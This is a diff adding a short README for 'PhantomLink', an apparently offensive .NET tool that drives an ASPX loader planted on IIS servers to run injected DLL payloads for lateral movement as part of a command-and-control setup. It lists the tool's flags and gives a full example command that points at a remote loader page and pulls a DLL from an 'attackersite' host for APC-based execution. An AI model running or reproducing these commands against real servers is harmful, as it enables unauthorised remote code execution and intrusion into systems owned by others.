@@ -1,1 +1,16 @@
+PhantomLink is a .NET tool designed to be used in combination with the Phantom Loader (ASPX). Its primary purpose is to integrate with a Command and Control (C2) framework to perform lateral movement or code execution against IIS servers.
+
+PhantomLink connects to a remote Phantom Loader ASPX page and triggers execution using custom injection settings and a supplied DLL payload, without requiring interactive access to the loader.
+
+How to use? 
+
+PhantomLink.exe -h         {print the help guide}
+PhantomLink.exe  -f        {Path to DLL payload in the remote target}
+PhantomLink.exe  -k        {Secret phrase }
+PhantomLink.exe -wp        {web stager to fetch DLL from remote host without a need to be called locally}
+PhantomLink.exe --func     {Export function name}
+PhantomLink.exe --sig      {Calling signature name}
+
+
+PhantomLink.exe --url http://remotehost/app/phantom.aspx -k {SECRET} -wp http://attackersite/mydll.dll --func Run --sig apc_execute 
 
